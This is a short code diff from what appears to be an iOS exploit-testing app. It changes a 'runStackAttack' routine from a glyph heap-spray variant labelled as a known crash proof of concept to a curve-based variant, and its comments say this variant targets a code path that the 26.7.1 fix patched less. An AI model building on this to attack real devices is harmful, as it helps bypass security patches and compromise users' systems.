@@ -653,15 +653,16 @@
 
 - (void)runStackAttack {
     if (![self beginJob]) return;
-    self.statusLabel.text = @"Glyph trigger test (g3 = Calif PoC)…";
-    [[KPLog shared] append:@"[RESULT] Glyph trigger test g3 — запуск"];
+    self.statusLabel.text = @"Glyph trigger test (curve variant)…";
+    [[KPLog shared] append:@"[RESULT] Glyph trigger test curve — запуск"];
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        // g3 = tx=32000, DX=33, HEAP 1056 — THE original crash (Calif PoC params)
-        NSString *report = [KPMapScope glyphSprayReportVariant:@"g3"];
+        // Curve variant: qCurveTo instead of lineTo → aa_quadto
+        // aa_quadto grew only +108 bytes in 26.7.1 fix vs +200 for aa_lineto
+        NSString *report = [KPMapScope glyphSprayReportVariant:@"curve"];
         dispatch_async(dispatch_get_main_queue(), ^{
             [[KPLog shared] append:report];
-            self.statusLabel.text = @"Glyph trigger g3 — см. лог";
-            [self saveExperimentReport:report fileName:@"kexproof-glyph-g3.txt"];
+            self.statusLabel.text = @"Glyph trigger curve — см. лог";
+            [self saveExperimentReport:report fileName:@"kexproof-glyph-curve.txt"];
             self.jobRunning = NO;
             [self updateExperimentButtons];
         });
